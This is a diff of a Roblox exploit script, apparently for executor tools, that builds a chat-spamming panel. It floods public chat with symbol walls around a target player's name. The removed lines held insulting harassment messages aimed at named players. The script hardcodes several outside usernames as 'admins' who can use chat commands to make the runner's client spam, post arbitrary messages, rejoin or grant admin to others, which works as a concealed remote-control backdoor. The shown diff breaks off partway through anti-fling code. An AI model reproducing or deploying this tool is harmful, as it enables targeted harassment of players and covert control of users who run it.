@@ -1,591 +1,497 @@
-local function cN(t)
-    pcall(function()
-        local s = game:GetService("TextChatService")
-        if s.ChatVersion == Enum.ChatVersion.TextChatService then
-            local c = s.TextChannels:FindFirstChild("RBXGeneral")
-            if c then c:SendAsync(t) end
-        else
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(t, "All")
-        end
-    end)
-end
-
-local players = game:GetService("Players")
-local RunService = game:GetService("RunService")
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 local TweenService = game:GetService("TweenService")
-local lp = players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 
--- OWNER & ADMIN LIST
-local OWNERS = {
-    ["roblox_user_8036317175"] = true,
-    [lp.Name] = true
-}
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+--==================================================
+-- ADMIN & CONFIG SETTINGS
+--==================================================
 
 local ADMINS = {
+    ["roblox_user_8036317175"] = true,
     ["sneaky_gmr"] = true,
     ["aaravgour1010"] = true,
     ["777xneoo"] = true,
-    ["777xzeus"] = true
+    ["777xzeus"] = true,
+    [Player.Name] = true
 }
 
-local function hasAccess(player)
-    local name = player.Name:lower()
-    local user = player.Name
-    return OWNERS[user] or OWNERS[name] or ADMINS[user] or ADMINS[name]
+local active = false
+local patternStep = 1
+local spamSpeed = 1.3
+
+-- 50+ Objects List
+local objects = {"Burger","Pizza","Qatar","Ethiopia","Fridge","Laptop","Toaster","Calculator","Socks","Blender","Microwave","Spoon","Table","Chair","Lamp","Charger","Battery","Mirror","Pencil","Notebook","Glue","Scissors","Ruler","Desk","Monitor","Keyboard","Mouse","Speaker","Remote","Wallet","Keys","Watch","Hat","Jacket","Backpack","Umbrella","Camera","Phone","Tablet","Console","Controller","Headset","Fan","Heater","Blanket","Pillow","Curtain","Rug","Clock"}
+
+-- Dynamic Wall Builder
+local function buildWall(msg)
+    local patterns = {"#- #", "@", "*_*"} 
+    local p = patterns[patternStep]
+    local currentText = " " .. msg
+    local remainingSpace = 195 - #currentText
+    local repeatCount = math.floor(remainingSpace / #p)
+    
+    local wall = string.rep(p, repeatCount) .. currentText
+    patternStep = (patternStep >= 3) and 1 or (patternStep + 1)
+    return wall
 end
 
-local function isOwnerOrSneaky(player)
-    local name = player.Name:lower()
-    local user = player.Name
-    return OWNERS[user] or OWNERS[name] or name == "sneaky_gmr" or user == "sneaky_gmr"
-end
+--==================================================
+-- LOADING SCREEN (YUVI DEVTA BRANDED)
+--==================================================
 
-local function isOwner(player)
-    local name = player.Name:lower()
-    local user = player.Name
-    return OWNERS[user] or OWNERS[name]
-end
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "YUVI DEVTA LOADING"
+LoadingGui.ResetOnSpawn = false
+LoadingGui.Parent = PlayerGui
 
-local sg = Instance.new("ScreenGui")
-sg.Name = "YuviHubGui"
-sg.ResetOnSpawn = false
+local LoadingMain = Instance.new("Frame")
+LoadingMain.Size = UDim2.new(0, 320, 0, 190)
+LoadingMain.Position = UDim2.new(0.5, -160, 0.5, -95)
+LoadingMain.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+LoadingMain.BorderSizePixel = 0
+LoadingMain.Parent = LoadingGui
 
-local function gP()
-    local s, t = pcall(function() return gethui() end)
-    if s and t then return t end
-    s, t = pcall(function() return game:GetService("CoreGui") end)
-    if s and t then return t end
-    return lp:WaitForChild("PlayerGui")
-end
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 16)
+LoadingCorner.Parent = LoadingMain
 
-sg.Parent = gP()
+local LoadingStroke = Instance.new("UIStroke")
+LoadingStroke.Color = Color3.fromRGB(220, 30, 255)
+LoadingStroke.Thickness = 2
+LoadingStroke.Parent = LoadingMain
 
-for _, v in pairs(gP():GetChildren()) do
-    if v.Name == "YuviHubGui" and v ~= sg then
-        v:Destroy()
-    end
-end
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Size = UDim2.new(1, 0, 0, 45)
+LoadingTitle.Position = UDim2.new(0, 0, 0, 15)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Text = "🦇 YUVI DEVTA 🦅🐍"
+LoadingTitle.TextSize = 22
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingTitle.Parent = LoadingMain
 
--- Notification Popup Function for Joins
-local function showJoinPopup(message, color)
-    pcall(function()
-        local notif = Instance.new("TextLabel")
-        notif.Size = UDim2.new(0, 320, 0, 45)
-        notif.Position = UDim2.new(0.5, -160, 0, -60)
-        notif.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
-        notif.TextColor3 = color
-        notif.TextSize = 13
-        notif.Font = Enum.Font.GothamBold
-        notif.Text = message
-        notif.Parent = sg
+local LoadingSub = Instance.new("TextLabel")
+LoadingSub.Size = UDim2.new(1, 0, 0, 25)
+LoadingSub.Position = UDim2.new(0, 0, 0, 55)
+LoadingSub.BackgroundTransparency = 1
+LoadingSub.Text = "ULTIMATE GTV HUB"
+LoadingSub.TextSize = 14
+LoadingSub.Font = Enum.Font.GothamBold
+LoadingSub.TextColor3 = Color3.fromRGB(180, 180, 185)
+LoadingSub.Parent = LoadingMain
 
-        local nCorner = Instance.new("UICorner")
-        nCorner.CornerRadius = UDim.new(0, 8)
-        nCorner.Parent = notif
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Size = UDim2.new(1, -30, 0, 25)
+LoadingText.Position = UDim2.new(0, 15, 0, 90)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = "INITIALIZING..."
+LoadingText.TextSize = 13
+LoadingText.Font = Enum.Font.Gotham
+LoadingText.TextColor3 = Color3.fromRGB(220, 220, 220)
+LoadingText.Parent = LoadingMain
 
-        local nStroke = Instance.new("UIStroke")
-        nStroke.Color = color
-        nStroke.Thickness = 2
-        nStroke.Parent = notif
+local ProgressBack = Instance.new("Frame")
+ProgressBack.Size = UDim2.new(1, -40, 0, 10)
+ProgressBack.Position = UDim2.new(0, 20, 0, 125)
+ProgressBack.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+ProgressBack.BorderSizePixel = 0
+ProgressBack.Parent = LoadingMain
 
-        notif:TweenPosition(UDim2.new(0.5, -160, 0, 20), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+local ProgressBackCorner = Instance.new("UICorner")
+ProgressBackCorner.CornerRadius = UDim.new(1, 0)
+ProgressBackCorner.Parent = ProgressBack
 
-        task.delay(4, function()
-            if notif and notif.Parent then
-                notif:TweenPosition(UDim2.new(0.5, -160, 0, -60), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.4, true)
-                task.wait(0.4)
-                notif:Destroy()
-            end
-        end)
-    end)
-end
+local Progress = Instance.new("Frame")
+Progress.Size = UDim2.new(0, 0, 1, 0)
+Progress.BackgroundColor3 = Color3.fromRGB(220, 30, 255)
+Progress.BorderSizePixel = 0
+Progress.Parent = ProgressBack
 
--- Detect Joins
-players.PlayerAdded:Connect(function(p)
-    if isOwner(p) then
-        showJoinPopup("👑 OWNER " .. p.Name .. " joined the server!", Color3.fromRGB(255, 215, 0))
-    elseif ADMINS[p.Name:lower()] or ADMINS[p.Name] then
-        showJoinPopup("🛡️ ADMIN " .. p.Name .. " joined the server!", Color3.fromRGB(50, 205, 50))
-    end
+local ProgressCorner = Instance.new("UICorner")
+ProgressCorner.CornerRadius = UDim.new(1, 0)
+ProgressCorner.Parent = Progress
+
+local Percent = Instance.new("TextLabel")
+Percent.Size = UDim2.new(1, 0, 0, 25)
+Percent.Position = UDim2.new(0, 0, 0, 140)
+Percent.BackgroundTransparency = 1
+Percent.Text = "0%"
+Percent.TextSize = 13
+Percent.Font = Enum.Font.GothamBold
+Percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+Percent.Parent = LoadingMain
+
+local LoadingMusic = Instance.new("Sound")
+LoadingMusic.Name = "YuviLoadingMusic"
+LoadingMusic.SoundId = "rbxassetid://71659730326072"
+LoadingMusic.Volume = 0.45
+LoadingMusic.Looped = true
+LoadingMusic.Parent = SoundService
+
+pcall(function()
+    LoadingMusic:Play()
 end)
 
+local LoadingTime = 8
+local StartTime = os.clock()
+
+while true do
+    local elapsed = os.clock() - StartTime
+    local progressAmount = math.clamp(elapsed / LoadingTime, 0, 1)
+
+    Progress.Size = UDim2.new(progressAmount, 0, 1, 0)
+
+    local percentValue = math.floor(progressAmount * 100)
+    Percent.Text = percentValue .. "%"
+
+    if percentValue < 25 then
+        LoadingText.Text = "INITIALIZING YUVI DEVTA..."
+    elseif percentValue < 50 then
+        LoadingText.Text = "LOADING MODULES..."
+    elseif percentValue < 75 then
+        LoadingText.Text = "PREPARING INTERFACE..."
+    elseif percentValue < 100 then
+        LoadingText.Text = "ALMOST READY..."
+    else
+        LoadingText.Text = "READY!"
+    end
+
+    if progressAmount >= 1 then
+        break
+    end
+
+    task.wait(0.03)
+end
+
+LoadingMusic:Stop()
+LoadingMusic:Destroy()
+
+local FadeInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+for _, obj in ipairs(LoadingMain:GetDescendants()) do
+    if obj:IsA("TextLabel") then
+        TweenService:Create(obj, FadeInfo, { TextTransparency = 1 }):Play()
+    elseif obj:IsA("Frame") then
+        TweenService:Create(obj, FadeInfo, { BackgroundTransparency = 1 }):Play()
+    elseif obj:IsA("UIStroke") then
+        TweenService:Create(obj, FadeInfo, { Transparency = 1 }):Play()
+    end
+end
+
+task.wait(0.45)
+LoadingGui:Destroy()
+
+--==================================================
+-- MAIN GUI
+--==================================================
+
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "YuviHubGui"
+Gui.ResetOnSpawn = false
+Gui.Parent = PlayerGui
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 320, 0, 235)
+Main.Position = UDim2.new(0.5, -160, 0.5, -117)
+Main.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+Main.BorderSizePixel = 0
+Main.Parent = Gui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 15)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Thickness = 2
+MainStroke.Parent = Main
+
+-- Rainbow Border Animation
 task.spawn(function()
-    task.wait(2)
-    for _, p in pairs(players:GetPlayers()) do
-        if p ~= lp then
-            if isOwner(p) then
-                showJoinPopup("👑 OWNER " .. p.Name .. " is in the server!", Color3.fromRGB(255, 215, 0))
-            elseif ADMINS[p.Name:lower()] or ADMINS[p.Name] then
-                showJoinPopup("🛡️ ADMIN " .. p.Name .. " is in the server!", Color3.fromRGB(50, 205, 50))
-            end
-        end
+    while MainStroke and MainStroke.Parent do
+        MainStroke.Color = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)
+        task.wait(0.05)
     end
 end)
 
--- Dark Theme & Neon Glow Colors
-local theme = {
-    bg = Color3.fromRGB(12, 12, 18),
-    header = Color3.fromRGB(20, 20, 28),
-    ambient = Color3.fromRGB(220, 30, 255),
-    text = Color3.fromRGB(255, 255, 255),
-    label = Color3.fromRGB(170, 170, 185),
-    inputBg = Color3.fromRGB(18, 18, 25),
-    greenBtn = Color3.fromRGB(40, 160, 80),
-    redBtn = Color3.fromRGB(180, 40, 40),
-    toggleOff = Color3.fromRGB(50, 50, 65),
-    toggleOn = Color3.fromRGB(180, 120, 20)
-}
-
-local f = Instance.new("Frame")
-f.Size = UDim2.new(0, 380, 0, 440)
-f.Position = UDim2.new(0.5, -190, 0.2, 0)
-f.BackgroundColor3 = theme.bg
-f.BorderSizePixel = 0
-f.Draggable = true
-f.Active = true
-f.Visible = true
-f.Parent = sg
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = f
-
-local stroke = Instance.new("UIStroke")
-stroke.Color = theme.ambient 
-stroke.Thickness = 2.5
-stroke.Parent = f
-
-local strokeCorner = Instance.new("UICorner")
-strokeCorner.CornerRadius = UDim.new(0, 12)
-strokeCorner.Parent = stroke
-
-local tl = Instance.new("TextLabel")
-tl.Size = UDim2.new(1, 0, 0, 40)
-tl.BackgroundColor3 = theme.header
-tl.Text = "  🦇 YUVI DEVTA 🦅🐍"
-tl.TextColor3 = Color3.fromRGB(255, 255, 255)
-tl.TextSize = 15
-tl.Font = Enum.Font.GothamBold
-tl.TextXAlignment = Enum.TextXAlignment.Left
-tl.Parent = f
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -50, 0, 45)
+Title.Position = UDim2.new(0, 15, 0, 5)
+Title.BackgroundTransparency = 1
+Title.Text = "🦇 YUVI DEVTA 🦅🐍"
+Title.TextSize = 18
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Parent = Main
 
 -- RGB Title Animation
 task.spawn(function()
-    while tl and tl.Parent do
+    while Title and Title.Parent do
         local hue = tick() % 5 / 5
-        tl.TextColor3 = Color3.fromHSV(hue, 1, 1)
+        Title.TextColor3 = Color3.fromHSV(hue, 1, 1)
         task.wait(0.05)
     end
 end)
 
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 12)
-titleCorner.Parent = tl
+local Minimize = Instance.new("TextButton")
+Minimize.Size = UDim2.new(0, 30, 0, 30)
+Minimize.Position = UDim2.new(1, -38, 0, 8)
+Minimize.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+Minimize.Text = "—"
+Minimize.TextSize = 18
+Minimize.Font = Enum.Font.GothamBold
+Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+Minimize.Parent = Main
 
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 28, 0, 28)
-closeBtn.Position = UDim2.new(1, -34, 0, 6)
-closeBtn.BackgroundColor3 = Color3.fromRGB(230, 50, 50)
-closeBtn.Text = "X"
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.TextSize = 13
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.Parent = f
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 8)
+MinCorner.Parent = Minimize
 
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 8)
-closeCorner.Parent = closeBtn
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, 0, 1, -50)
+Content.Position = UDim2.new(0, 0, 0, 50)
+Content.BackgroundTransparency = 1
+Content.Parent = Main
 
-local fl = Instance.new("TextButton")
-fl.Size = UDim2.new(0, 90, 0, 40)
-fl.Position = UDim2.new(0.85, 0, 0.75, 0)
-fl.BackgroundColor3 = theme.header
-fl.Text = "YUVI DEVTA"
-fl.TextColor3 = Color3.fromRGB(255, 255, 255)
-fl.TextSize = 13
-fl.Font = Enum.Font.GothamBold
-fl.Visible = false
-fl.Parent = sg
+local NameBox = Instance.new("TextBox")
+NameBox.Size = UDim2.new(1, -30, 0, 40)
+NameBox.Position = UDim2.new(0, 15, 0, 5)
+NameBox.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
+NameBox.BorderSizePixel = 0
+NameBox.PlaceholderText = "ENTER TARGET NAME"
+NameBox.Text = "Roblox"
+NameBox.TextSize = 14
+NameBox.Font = Enum.Font.Gotham
+NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+NameBox.PlaceholderColor3 = Color3.fromRGB(130, 130, 140)
+NameBox.Parent = Content
 
-task.spawn(function()
-    while fl and fl.Parent do
-        local hue = tick() % 5 / 5
-        fl.TextColor3 = Color3.fromHSV(hue, 1, 1)
-        task.wait(0.05)
+local NameCorner = Instance.new("UICorner")
+NameCorner.CornerRadius = UDim.new(0, 9)
+NameCorner.Parent = NameBox
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -30, 0, 25)
+Status.Position = UDim2.new(0, 15, 0, 52)
+Status.BackgroundTransparency = 1
+Status.Text = "● READY"
+Status.TextSize = 12
+Status.Font = Enum.Font.GothamBold
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.TextColor3 = Color3.fromRGB(180, 180, 185)
+Status.Parent = Content
+
+local Start = Instance.new("TextButton")
+Start.Size = UDim2.new(0.5, -20, 0, 42)
+Start.Position = UDim2.new(0, 15, 0, 82)
+Start.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
+Start.BorderSizePixel = 0
+Start.Text = "▶ START"
+Start.TextSize = 14
+Start.Font = Enum.Font.GothamBold
+Start.TextColor3 = Color3.fromRGB(255, 255, 255)
+Start.Parent = Content
+
+local StartCorner = Instance.new("UICorner")
+StartCorner.CornerRadius = UDim.new(0, 9)
+StartCorner.Parent = Start
+
+local Stop = Instance.new("TextButton")
+Stop.Size = UDim2.new(0.5, -20, 0, 42)
+Stop.Position = UDim2.new(0.5, 5, 0, 82)
+Stop.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+Stop.BorderSizePixel = 0
+Stop.Text = "■ STOP"
+Stop.TextSize = 14
+Stop.Font = Enum.Font.GothamBold
+Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
+Stop.Parent = Content
+
+local StopCorner = Instance.new("UICorner")
+StopCorner.CornerRadius = UDim.new(0, 9)
+StopCorner.Parent = Stop
+
+--==================================================
+-- DRAG LOGIC
+--==================================================
+
+local dragging = false
+local dragStart
+local startPos
+
+Main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
     end
 end)
 
-local flCorner = Instance.new("UICorner")
-flCorner.CornerRadius = UDim.new(0, 8)
-flCorner.Parent = fl
+UserInputService.InputChanged:Connect(function(input)
+    if not dragging then return end
 
-closeBtn.MouseButton1Click:Connect(function()
-    f.Visible = false
-    fl.Visible = true
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        local delta = input.Position - dragStart
+        Main.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
 end)
 
-fl.MouseButton1Click:Connect(function()
-    f.Visible = true
-    fl.Visible = false
+--==================================================
+-- MINIMIZE LOGIC
+--==================================================
+
+local minimized = false
+
+Minimize.MouseButton1Click:Connect(function()
+    minimized = not minimized
+
+    if minimized then
+        Minimize.Text = "+"
+        Content.Visible = false
+        TweenService:Create(Main, TweenInfo.new(0.25), {
+            Size = UDim2.new(0, 200, 0, 55)
+        }):Play()
+    else
+        Minimize.Text = "—"
+        Content.Visible = true
+        TweenService:Create(Main, TweenInfo.new(0.25), {
+            Size = UDim2.new(0, 320, 0, 235)
+        }):Play()
+    end
 end)
 
-getgenv().Target = "NAME"
-getgenv().Symbol = "_"
-getgenv().Count = 150
-getgenv().Delay = 1.2
-getgenv().Enabled = false
-getgenv().AntiFlingEnabled = false
-getgenv().BurstMode = false
+--==================================================
+-- CHAT SENDER ENGINE
+--==================================================
 
-local ms = {
-    "tmx mare zeus aur neo🐍🦅",
-    "tmx maru udte udte🤣🤣🤣🤣🤣",
-    "yuvi papa on top h pgl",
-    "gulaam tmx uth",
-    "tmx pagal hogai ",
-    "tmx cvr le gulaam"
-}
-local cM = 1
-local y = 50
-
-local function aF(l, d, cb)
-    local la = Instance.new("TextLabel")
-    la.Size = UDim2.new(0, 65, 0, 26)
-    la.Position = UDim2.new(0, 15, 0, y)
-    la.BackgroundTransparency = 1
-    la.Text = l
-    la.TextColor3 = theme.label
-    la.TextSize = 13
-    la.Font = Enum.Font.GothamMedium
-    la.TextXAlignment = Enum.TextXAlignment.Left
-    la.Parent = f
-
-    local b = Instance.new("TextBox")
-    b.Size = UDim2.new(0, 160, 0, 26)
-    b.Position = UDim2.new(0, 85, 0, y)
-    b.Text = tostring(d)
-    b.BackgroundColor3 = theme.inputBg
-    b.TextColor3 = theme.text
-    b.TextSize = 13
-    b.Font = Enum.Font.Gotham
-    b.Parent = f
-
-    local bCorner = Instance.new("UICorner")
-    bCorner.CornerRadius = UDim.new(0, 6)
-    bCorner.Parent = b
-
-    b.FocusLost:Connect(function()
-        cb(b.Text)
+local function chat(msg)
+    task.spawn(function()
+        pcall(function()
+            local ch = TextChatService:FindFirstChild("RBXGeneral", true) or (TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral"))
+            if ch then ch:SendAsync(msg) end
+            local say = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+            if say then say:FireServer(msg, "All") end
+        end)
     end)
-    y = y + 32
 end
 
-aF("ENEMY", getgenv().Target, function(v) getgenv().Target = v end)
-aF("Symbol", getgenv().Symbol, function(v) getgenv().Symbol = v end)
-aF("Count", getgenv().Count, function(v) getgenv().Count = tonumber(v) or 150 end)
-aF("Speed", getgenv().Delay, function(v) getgenv().Delay = tonumber(v) or 1.2 end)
+--==================================================
+-- COMMAND HANDLER (ADMINS & GIVE / SAY / SIT / RJ)
+--==================================================
 
--- Antifling Toggle Button
-local afBtn = Instance.new("TextButton")
-afBtn.Size = UDim2.new(0, 350, 0, 28)
-afBtn.Position = UDim2.new(0, 15, 0, 182)
-afBtn.BackgroundColor3 = theme.toggleOff
-afBtn.Text = "🛡️ Anti-Fling: OFF"
-afBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-afBtn.TextSize = 12
-afBtn.Font = Enum.Font.GothamBold
-afBtn.Parent = f
-
-local afCorner = Instance.new("UICorner")
-afCorner.CornerRadius = UDim.new(0, 8)
-afCorner.Parent = afBtn
-
-afBtn.MouseButton1Click:Connect(function()
-    getgenv().AntiFlingEnabled = not getgenv().AntiFlingEnabled
-    if getgenv().AntiFlingEnabled then
-        afBtn.Text = "🛡️ Anti-Fling: ON"
-        afBtn.BackgroundColor3 = theme.toggleOn
-    else
-        afBtn.Text = "🛡️ Anti-Fling: OFF"
-        afBtn.BackgroundColor3 = theme.toggleOff
-    end
-end)
-
--- Burst Mode Toggle Button
-local burstBtn = Instance.new("TextButton")
-burstBtn.Size = UDim2.new(0, 350, 0, 28)
-burstBtn.Position = UDim2.new(0, 15, 0, 216)
-burstBtn.BackgroundColor3 = theme.toggleOff
-burstBtn.Text = "⚡ Burst Mode (5 Msgs): OFF"
-burstBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-burstBtn.TextSize = 12
-burstBtn.Font = Enum.Font.GothamBold
-burstBtn.Parent = f
-
-local burstCorner = Instance.new("UICorner")
-burstCorner.CornerRadius = UDim.new(0, 8)
-burstCorner.Parent = burstBtn
-
-burstBtn.MouseButton1Click:Connect(function()
-    getgenv().BurstMode = not getgenv().BurstMode
-    if getgenv().BurstMode then
-        burstBtn.Text = "⚡ Burst Mode (5 Msgs): ON"
-        burstBtn.BackgroundColor3 = theme.toggleOn
-    else
-        burstBtn.Text = "⚡ Burst Mode (5 Msgs): OFF"
-        burstBtn.BackgroundColor3 = theme.toggleOff
-    end
-end)
-
--- START & STOP Buttons
-local sB = Instance.new("TextButton")
-sB.Size = UDim2.new(0, 168, 0, 36)
-sB.Position = UDim2.new(0, 15, 0, 254)
-sB.BackgroundColor3 = theme.greenBtn
-sB.Text = "▶ START"
-sB.TextColor3 = Color3.fromRGB(255, 255, 255)
-sB.TextSize = 14
-sB.Font = Enum.Font.GothamBold
-sB.Parent = f
-
-local sBCorner = Instance.new("UICorner")
-sBCorner.CornerRadius = UDim.new(0, 8)
-sBCorner.Parent = sB
-
-local stopB = Instance.new("TextButton")
-stopB.Size = UDim2.new(0, 168, 0, 36)
-stopB.Position = UDim2.new(0, 197, 0, 254)
-stopB.BackgroundColor3 = theme.redBtn
-stopB.Text = "⏹ STOP"
-stopB.TextColor3 = Color3.fromRGB(255, 255, 255)
-stopB.TextSize = 14
-stopB.Font = Enum.Font.GothamBold
-stopB.Parent = f
-
-local stopBCorner = Instance.new("UICorner")
-stopBCorner.CornerRadius = UDim.new(0, 8)
-stopBCorner.Parent = stopB
-
--- Command Handler for Owner & Admins
 local function handleCmd(text, sender)
     local split = text:lower():split(" ")
     local cmd = split[1]
-    local arg1 = split[2]
-    local arg2 = split[3]
-
-    if cmd == "!start" then
-        getgenv().Enabled = true
-        sB.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
-        stopB.BackgroundColor3 = theme.redBtn
-        cN("▶ Spammer Started by Admin/Owner: " .. sender.Name)
-    elseif cmd == "!stop" then
-        getgenv().Enabled = false
-        sB.BackgroundColor3 = theme.greenBtn
-        stopB.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
-        cN("⏹ Spammer Stopped by Admin/Owner: " .. sender.Name)
-    elseif cmd == "!startspm" and arg1 and isOwnerOrSneaky(sender) then
-        local targetQuery = arg1:gsub("@", ""):lower()
-        if lp.Name:lower():find(targetQuery) then
-            if arg2 then
-                getgenv().Target = arg2
+    local arg = split[2]
+    
+    if cmd == "!give" and arg then
+        for _, p in pairs(Players:GetPlayers()) do
+            if p.Name:lower():find(arg) then 
+                ADMINS[p.Name] = true
+                chat("YUVI DEVTA: Admin Added -> " .. p.Name) 
             end
-            getgenv().Enabled = true
-            sB.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
-            stopB.BackgroundColor3 = theme.redBtn
-            cN("Forcefully started @" .. lp.Name .. " (Target: " .. tostring(getgenv().Target) .. ") and by YUVIDEVTA 🐍🦅")
         end
-    elseif cmd == "!stopspm" and arg1 and isOwnerOrSneaky(sender) then
-        local targetQuery = arg1:gsub("@", ""):lower()
-        if lp.Name:lower():find(targetQuery) then
-            getgenv().Enabled = false
-            sB.BackgroundColor3 = theme.greenBtn
-            stopB.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
-            cN("Forcefully stopped @" .. lp.Name .. " and by YUVIDEVTA 🐍🦅")
-        end
-    elseif cmd == "!say" and arg1 then
-        cN(text:sub(6))
-    elseif cmd == "!rj" then
-        game:GetService("TeleportService"):Teleport(game.PlaceId, lp)
+    elseif cmd == "!start" then
+        active = true
+        Status.Text = "● RUNNING"
+        Start.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
+        Stop.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+        chat("YUVI DEVTA: Spammer Started by " .. sender.Name)
+    elseif cmd == "!stop" then
+        active = false
+        Status.Text = "● STOPPED"
+        Start.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
+        Stop.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
+        chat("YUVI DEVTA: Spammer Stopped by " .. sender.Name)
     elseif cmd == "!sit" then
-        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
-            lp.Character.Humanoid.Sit = true
+        if Player.Character and Player.Character:FindFirstChild("Humanoid") then 
+            Player.Character.Humanoid.Sit = true 
         end
-    elseif cmd == "!cmds" or cmd == "!help" then
-        cN("👑 Yuvi Devta Cmds: !start | !stop | !startspm @user target | !stopspm @user | !sit | !rj")
+    elseif cmd == "!say" and arg then
+        chat(text:sub(6))
+    elseif cmd == "!rj" then
+        TeleportService:Teleport(game.PlaceId, Player)
+    elseif cmd == "!cmds" then
+        chat("Cmds: !give [user], !start, !stop, !sit, !say [msg], !rj")
     end
 end
 
-for _, p in pairs(players:GetPlayers()) do
-    p.Chatted:Connect(function(m)
-        if hasAccess(p) then handleCmd(m, p) end
-    end)
+for _, p in pairs(Players:GetPlayers()) do 
+    p.Chatted:Connect(function(m) 
+        if ADMINS[p.Name] or ADMINS[p.Name:lower()] then handleCmd(m, p) end 
+    end) 
 end
-players.PlayerAdded:Connect(function(p)
-    p.Chatted:Connect(function(m)
-        if hasAccess(p) then handleCmd(m, p) end
-    end)
+Players.PlayerAdded:Connect(function(p) 
+    p.Chatted:Connect(function(m) 
+        if ADMINS[p.Name] or ADMINS[p.Name:lower()] then handleCmd(m, p) end 
+    end) 
 end)
 
--- Anti-Fling Logic
-local MAX_SPEED = 120
-local MAX_ANGULAR = 80
-local MAX_DISTANCE = 50
-local CHECK_INTERVAL = 0.05
-local RECOVERY_TIME = 0.40
+--==================================================
+-- SPAM LOOP (WITH DYNAMIC WALLS & RANDOM OBJECTS)
+--==================================================
 
-local character, humanoid, root
-local safeCFrame
-local timer = 0
-local recoveryUntil = 0
-
-local function disableCollision(char)
-    for _, obj in ipairs(char:GetDescendants()) do
-        if obj:IsA("BasePart") then
-            obj.CanCollide = false
-        end
-    end
-end
-
-local function watchCharacterCollision(char)
-    disableCollision(char)
-    char.DescendantAdded:Connect(function(obj)
-        if obj:IsA("BasePart") then
-            obj.CanCollide = false
-        end
-    end)
-end
-
-local function setupCharacter(char)
-    character = char
-    humanoid = char:WaitForChild("Humanoid")
-    root = char:WaitForChild("HumanoidRootPart")
-    watchCharacterCollision(char)
-    safeCFrame = root.CFrame
-    timer = 0
-    recoveryUntil = 0
-end
-
-if lp.Character then
-    setupCharacter(lp.Character)
-end
-lp.CharacterAdded:Connect(setupCharacter)
-
-RunService.Heartbeat:Connect(function(dt)
-    if not getgenv().AntiFlingEnabled then return end
-    if not character or not character.Parent or not humanoid or humanoid.Health <= 0 or not root or not root.Parent then
-        return
-    end
-
-    timer += dt
-    if timer < CHECK_INTERVAL then return end
-    timer = 0
-
